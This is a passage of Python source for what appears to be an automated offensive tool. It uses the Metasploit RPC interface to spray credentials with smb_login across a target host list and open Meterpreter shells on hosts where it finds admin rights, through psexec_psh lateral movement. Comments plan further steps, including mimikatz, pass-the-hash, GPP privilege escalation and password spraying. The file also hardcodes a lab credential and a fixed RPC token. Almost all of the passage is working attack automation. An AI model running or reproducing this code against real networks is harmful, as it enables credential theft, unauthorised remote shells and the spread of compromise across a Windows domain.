    if cred_type == 'hash' and rid != '500':
        return

    filename = 'unchecked_hosts'
    domain_data_key = 'hosts'
    target_ips = create_hostsfile(dom_data_copy, filename, domain_data_key)
    c_id = await get_nonbusy_cid(client, c_ids)

    cmd, output, err = await run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips)

    await parse_module_output(lock, c_id, err, cmd, output, domain_data)

async def get_admin_session_data(lock, sess_data, domain_data):

    # Get all session IPs and figure out if they're admin shells so we don't overlap our spread
    admin_sess_data = {}
    with await lock:
        for sess_num in sess_data:
            ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
            utf8_ip = ip.decode('utf8')
            if b'admin_shell' not in sess_data[sess_num]:
                continue

            # In case we have multiple shells on the same IP, we must collect
            # all their admin_shell properties to check later if we have any
            # admin shells on that IP
            admin_sess_data[ip] = []

            admin_shell = sess_data[sess_num][b'admin_shell']
            admin_sess_data[ip].append(admin_shell)

            # Remove IP from pending_shell_ips which exists so spread() doesn't
            # spread to an IP that's waiting for psexec_psh to finish
            if admin_shell == b'True':
                if utf8_ip in domain_data['pending_shell_ips']:
                    domain_data['pending_shell_ips'].remove(utf8_ip)

    return admin_sess_data

async def get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy):

    admin_session_data = await get_admin_session_data(lock, sess_data, domain_data)

    c_id = await get_nonbusy_cid(client, c_ids)

    # run psexec_psh on all ips that we either don't have a shell on already or don't have an admin shell on
    # dom_data_copy['checked_creds']['LAB\\dan:P@ssw0rd'] = [list of ips we have admin for those creds]
    for creds in dom_data_copy['checked_creds']:
        for admin_ip in dom_data_copy['checked_creds'][creds]:
            bytes_admin_ip = admin_ip.encode()

            # Shells take a minute to open so we don't want to double up on shells while they open
            if admin_ip not in domain_data['pending_shell_ips']:

                # Check if the IP we have admin on already has a session
                if bytes_admin_ip in admin_session_data:

                    # If we have a shell on it but we're not admin, then continue get admin shell
                    # admin_shell_vals = [b'True', b'False', b'True'] depending on how many shells we have on that IP
                    # Making design decision here to not check if the session is broken or not because it's too easy
                    # for that to lead to infinite loops of spreading with broken sess after broken sess
                    admin_shell_vals = [x for x in admin_session_data[bytes_admin_ip]]
                    if b'True' in admin_shell_vals:
                        continue

                # Either we don't have this IP in our session, or there's no admin session open on it
                await run_psexec_psh(lock, client, c_id, creds, admin_ip, lhost, domain_data)
#                await get_shell_wmic(lock, client, c_id, creds, admin_ip, lhost, domain_data)

async def run_psexec_psh(lock, client, c_id, creds, ip, lhost, domain_data):
    dom, user, pwd, rid = parse_creds(creds)

    # Skip non-RID 500 local logins for now
    # Move this later on so we can PTH of domain admins we find - debug
    if dom == '.':
        if rid != '500':
            return

    mod = 'exploit/windows/smb/psexec_psh'
    rhost_var = 'RHOST'
    start_cmd = 'exploit -z'
    extra_opts = ('set smbuser {}\n'
                  'set smbpass {}\n'
                  'set smbdomain {}'.format(user, pwd, dom))
    end_strs = [b'[*] Meterpreter session ']

    domain_data['pending_shell_ips'].append(ip)
    print_info('Performing lateral movement with credentials [{}:{}] against host [{}]'.format(user, pwd, ip), 'Console', c_id)
    cmd, output, err = await run_msf_module(client, c_id, mod, rhost_var, ip, lhost, extra_opts, start_cmd, end_strs)
    await parse_module_output(lock, c_id, err, cmd, output, domain_data)

async def parse_module_output(lock, c_id, err, cmd, output, domain_data):
    if 'smb_login' in cmd:
        await parse_smb_login(lock, c_id, output, domain_data)
    elif 'psexec_psh' in cmd:
        await parse_psexec_psh(lock, c_id, err, cmd, output, domain_data)

async def remove_pending_ip(lock, ip, domain_data):
    with await lock:
        if ip in domain_data['pending_shell_ips']:
            domain_data['pending_shell_ips'].remove(ip)

async def parse_psexec_psh(lock, c_id, err, cmd, output, domain_data):
    user = None

    for l in cmd.splitlines():
        if 'RHOST' in l:
            ip = l.split()[-1]

    # If run_psexec_psh fails then remove the IP from pending_shell_ips
    if not output:
        await remove_pending_ip(lock, ip, domain_data)

    elif err:
        await remove_pending_ip(lock, ip, domain_data)

    else:
        for l in output.splitlines():
            l = l.strip().decode('utf8')
            if 'smbuser =>' in l:
                user = l.split()[-1]
            elif '[*] Meterpreter session ' in l:
                l_split = l.split()
                ip = l_split[7][:-1].split(':')[0]
                print_good('Successfully opened new shell with admin [{}] on [{}]'.format(user, ip), 'Console', c_id)
            elif 'no session was created' in l:
                await remove_pending_ip(lock, ip, domain_data)

async def create_user_pwd_creds(lock, user, pwd, dom, domain_data):
    '''Parse out the username and domain
    When PTH with RID 500, the domain will just say "."
    user_pwd is what we print, creds is what we use in domain_data
    This is necessary to preserve hashdumped creds' RID number'''
    if dom != '.':
        dom_user = dom+'\\'+user
        creds = dom_user+':'+pwd
        user_pwd = creds

    # PTH user
    else:
        with await lock:
            for c in domain_data['creds']:
                if user in c and pwd in c:
                    user_pwd = user+':'+pwd
                    creds = c

    return user_pwd, creds

async def parse_smb_login(lock, c_id, output, domain_data):

    user = None
    pwd = None
    dom = None
    user_pwd = None
    creds = None
    admin_found = False

    if output:
        out_split = output.splitlines()
    else:
        return 

    for l in out_split:
        l = l.strip().decode('utf8')

        if 'smbuser' in l:
            user = l.split()[-1]
        if 'smbpass' in l:
            pwd = l.split()[-1]
        if 'smbdomain' in l:
            dom = l.split()[-1].lower()

        if user and pwd and dom:
            user_pwd, creds = await create_user_pwd_creds(lock, user, pwd, dom, domain_data)

        if '- Success: ' in l:

            if not creds:
                print_bad('Found successful login, but unable to parse domain, user and password', 'Console', c_id)
                print_bad('    '+l, 'Console', c_id)

            ip_port = l.split()[1]
            ip = ip_port.split(':')[0]
            admin_str = "' Administrator"
            if l.endswith(admin_str):

                if ip in domain_data['domain_controllers']:
                    print_great('Admin credentials found against [{}] domain controller! [{}]'.format(ip, user_pwd),
                                None, None)
#                    end_script()

                # IP will only be in there if the creds are admin on the box
                # checked_creds is only appended to by spread() future
                if ip in domain_data['checked_creds'][creds]:
                    continue

                domain_data['checked_creds'][creds].append(ip)
                print_good('Admin login found! [{} - {}]'.format(ip, user_pwd), 'Console', c_id)
                admin_found = True

            else:
                print_info('Non-admin login found [{} - {}]'.format(ip, user_pwd), 'Console', c_id)

    if not admin_found:
        if user_pwd:
            print_bad('No admin logins found with [{}]'.format(user_pwd), 'Console', c_id)
        else:
            print_bad('Failed to parse smb_login output', 'Console', c_id)

def create_hostsfile(dom_data_copy, filename, domain_data_key):

    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))
    fname = '{}-{}.txt'.format(filename, identifier)
    with open(fname, 'w') as f:
        for ip in dom_data_copy[domain_data_key]:
            f.write(ip+'\n')

    return 'file:'+os.getcwd()+'/'+fname

async def attack(lock, client, sess_num, sess_data, domain_data):

    # Is admin
    if sess_data[sess_num][b'admin_shell'] == b'True':
        # mimikatz, spray, PTH RID 500
        await get_passwords(lock, client, sess_num, sess_data, domain_data)

    # Not admin
    elif sess_data[sess_num][b'admin_shell'] == b'False':
        # Domain joined

        if sess_data[sess_num][b'local_admin'] == b'False':
            # Give up
            pass

    # START ATTACKING! FINALLY!
    # not domain joined and not admin
        # fuck it?
    # not domain joined but admin
        # mimikatz
    # domain joined and not admin
        # GPP privesc
        # Check for seimpersonate
        # Check for dcsync
        # userhunter
        # spray and pray
    # domain joined and admin
        # GPP
        # userhunter
        # spray and pray



def get_output(client, sess_num):
    sess_num_str = str(sess_num)
    output = client.call('session.meterpreter_read', [sess_num_str])

    # Everythings fine
    if b'data' in output:
        return (output[b'data'], None)

    # Got an error from the client.call
    elif b'error_message' in output:
        decoded_err = output[b'error_message'].decode('utf8')
        return (None, decoded_err)

def get_output_errors(output, cmd):

    script_errors = [b'[-] post failed',
                     b'error in script',
                     b'operation failed',
                     b'unknown command',
                     b'operation timed out',
                     b'unknown session id',
                     b'error running',
                     b'failed to load extension',
                     b'requesterror',
                     b'is not a valid option for this module',
                     b'is not recognized as an',
                     b'exploit failed: rex::',
                     b'error:     + fullyqualifiederrorid : ']
    err = None

    # Got an error from output
    if any(x in output.lower() for x in script_errors):
        err = 'Command [{}] failed with error: {}'.format(cmd.splitlines()[0], output.decode('utf8').strip())

    return err

def error_printing(sess_num, sess_data, err, cmd):
    ''' We have to handle powershell errors a lot different than regular MSF error '''
    no_print_errs = ['powershell_execute: operation failed: 2148734468',
                     'error running command powershell_execute: rex::timeouterror operation timed out']
    allowed_to_timeout = ['find-domainuserlocation', 'rm "']

    if not any(e in err.lower() for e in no_print_errs):
        # Find-DomainUserLocation and "rm" are allowed to timeout
        # don't print it or add the error to the session
        if 'Command [' in err and '] timed out' in err:
            if any(x in cmd.lower() for x in allowed_to_timeout):
                return

        # An error occurred which is not present in no_print_errs
        sess_data[sess_num][b'errors'].append(err)
        print_bad(err, 'Session', sess_num)

    # We found of the no print errors but it's for the check to see if the long running
    # psh command finished which we expect will error if first psh command isn't done
    else:
        if 'find-domainuserlocation >' in cmd.lower():
            if no_print_errs[0] in err:
                sess_data[sess_num][b'errors'].append(err)
                print_bad(err, 'Session', sess_num)

async def run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='run_single', timeout=60):

    err = None
    output = None
    error_msg = 'Error in session {}: {}'
    sess_num_str = str(sess_num)

    print_info('Running [{}]'.format(cmd.strip()), 'Session', sess_num)

    res = client.call('session.meterpreter_{}'.format(api_call), [str(sess_num), cmd])
    long_running_psh = ['Find-DomainUserLocation']

    # Error from MSF API
    if b'error_message' in res:
        err_msg = res[b'error_message'].decode('utf8')
        print_bad(error_msg.format(sess_num_str, err_msg), 'Session', sess_num)
        sess_data[sess_num][b'errors'].append(err_msg)
        return (None, err_msg)

    # Successfully completed MSF API call
    elif res[b'result'] == b'success':

        counter = 0
        sleep_secs = 1
        full_output = b''

        try:
            num_es = 1
            while True:
                await asyncio.sleep(sleep_secs)

                output, err = get_output(client, sess_num)
                if output:
                    full_output += output

                # Error from meterpreter console
                if err:
                    sess_data[sess_num][b'errors'].append(err)
                    print_bad('Meterpreter error: {}'.format(err), 'Session', sess_num)
                    break

                # Check for errors from cmd's output
                err = get_output_errors(full_output, cmd)
                if err:
                    error_printing(sess_num, sess_data, err, cmd)
                    break

                # If no terminating string specified just wait til timeout
                counter += sleep_secs
                if counter > timeout:
                    err = 'Command [{}] timed out'.format(cmd.strip())
                    error_printing(sess_num, sess_data, err, cmd)
                    break

                # Successfully completed - this section can probably be cleaned up
                if end_strs:
                    if any(end_strs in output for end_strs in end_strs):
                        break

                # If no end_strs specified just return once we have any data or until timeout
                else:
                    if len(full_output) > 0:
                        break

        # This usually occurs when the session suddenly dies or user quits it
        except Exception as e:
            # Get the last of the data to clear the buffer
            clear_buffer = client.call('session.meterpreter_read', [sess_num_str])
            err = 'exception below likely due to abrupt death of session'
            print_bad(error_msg.format(sess_num_str, err), 'Session', sess_num)
            print_bad('    '+str(e), None, None)
            sess_data[sess_num][b'errors'].append(err)
            debug_info(full_output, 'Session', sess_num)
            return (full_output, err)

    # b'result' not in res, b'error_message' not in res, just catch everything else as an error
    else:
        err = res[b'result'].decode('utf8')
        sess_data[sess_num][b'errors'].append(err)
        print_bad(res[b'result'].decode('utf8'), 'Session', sess_num)

    # Get the last of the data to clear the buffer
    clear_buffer = client.call('session.meterpreter_read', [sess_num_str])

    debug_info(full_output, 'Session', sess_num)

    return (full_output, err)

def get_perm_token(client):
    # Authenticate and grab a permanent token
    try:
        client.login(args.username, args.password)
    except msfrpc.MsfAuthError:
        print_bad('Authentication to the MSF RPC server failed, are you sure you have the right password?', None, None)
    client.call('auth.token_add', ['123'])
    client.token = '123'
    return client

def is_session_broken(lock, sess_num, sess_data):
    if b'errors' in sess_data[sess_num]:

        # Session timed out on initial sysinfo cmd
        if b'user' not in sess_data[sess_num]:
            return True

        # Session abruptly died
        msgs = ['abrupt death of session', 'unknown session id']
        #with await lock:
        for err in sess_data[sess_num][b'errors']:
            if len([m for m in msgs if m in err.lower()]) > 0:
                return True

        # Session timed out
        if 'Rex::TimeoutError' in sess_data[sess_num][b'errors']:
            return True

    return False

async def add_session_keys(msf_sess, sess_data, msf_sess_num):
    for k in sess_data[msf_sess_num]:
        if k not in msf_sess:
            msf_sess[k] = sess_data[msf_sess_num].get(k)

    return session

async def get_sessions(lock, client, domain_data, sess_data):
    print_waiting = True
    sleep_secs = 2

    ## exists for potential debug purposes ##
    counter = 0
    if counter > 30:
        # Yes this is public information but just here for debugging
        domain_data['creds'].append('lab2\\dan.da:Qwerty1da')

    while True:
        # Get list of MSF sessions from RPC server
        msf_sessions = client.call('session.list')

        for msf_sess_num in msf_sessions:
            # Do stuff with session
            if msf_sess_num not in sess_data:
                update_session(msf_sessions[msf_sess_num], msf_sess_num, sess_data)
                print_waiting = False

                # Attack!
                asyncio.ensure_future(attack_with_session(lock,
                                                          client,
                                                          msf_sess_num,
                                                          sess_data,
                                                          domain_data))

        busy_sess = False
        with await lock:
            for n in sess_data:
                if b'busy' in sess_data[n]:
                    if sess_data[n][b'busy'] == b'True':
                        busy_sess = True
                        print_waiting = True
                        break

        if busy_sess == False:
            if print_waiting:
                print_waiting = False
                print_info('Waiting on new meterpreter session', None, None)

        await asyncio.sleep(1)

        counter += 1 # here for potential debug purposes

def parse_nmap_xml():
    hosts = []
    try:
        report = NmapParser.parse_fromfile(args.xml)
        for host in report.hosts:
            if host.is_up():
                for s in host.services:
                    if s.port == 445:
                        if s.state == 'open':
                            host = host.address
                            if host not in hosts:
                                hosts.append(host)
    except FileNotFoundError:
        print_bad('Host file not found: {}'.format(args.xml), None, None)
        sys.exit()

    return hosts

def parse_host_list():
    hosts = []
    try:
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24', None, None)
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?', None, None)
                    sys.exit()
    except FileNotFoundError:
        print_bad(args.hostlist+' not found', None, None)
        sys.exit()

    return hosts

def parse_hosts(domain_data):
    hosts = []

    if args.xml:
        hosts = parse_nmap_xml()

    elif args.hostlist:
        hosts = parse_host_list()

    domain_data['hosts'] = hosts

async def attack_with_session(lock, client, sess_num, sess_data, domain_data):

    task = await sess_first_check(lock, client, sess_num, sess_data, domain_data)
    if task:
        await asyncio.wait(task)

    if is_session_broken(lock, sess_num, sess_data) == False:
        await attack(lock, client, sess_num, sess_data, domain_data)

def main():

    lock = asyncio.Lock()
    client = msfrpc.Msfrpc({})
    sess_data = {}
    # domain_data = {'domain':[domain_admins]}
    domain_data = {'domains':{},
                   'domain_admins':[],
                   'high_priority_ips':[],
                   'pending_shell_ips':[],
                   'creds':[],
                   'checked_creds':{},
                   'hosts':[]}

    if args.hostlist or args.xml:
        parse_hosts(domain_data)

    try:
        client = get_perm_token(client)
    except:
        print_bad('Failed to connect to MSF RPC server,'
                  ' are you sure metasploit is running and you have the right password?',
                  None, None)
        sys.exit()

    c_ids = get_console_ids(client)
    lhost = get_local_ip(get_iface())

    loop = asyncio.get_event_loop()
    loop.add_signal_handler(signal.SIGINT, kill_tasks)

    fut_get_sessions = asyncio.ensure_future(get_sessions(lock,
                                                            client,
                                                            domain_data,
                                                            sess_data))


    fut_spread = asyncio.ensure_future(spread(lock,
                                              client,
                                              c_ids,
                                              lhost,
                                              sess_data,
                                              domain_data))

    try:
        loop.run_until_complete(asyncio.gather(fut_get_sessions, fut_spread))
    except asyncio.CancelledError:
        print_info('Tasks gracefully smited.', None, None)
    finally:
        loop.close()

if __name__ == "__main__":
    args = parse_args()
#    if os.geteuid():
#        print_bad('Run as root', None, None)
#        sys.exit()
    main()

## Left off
#599
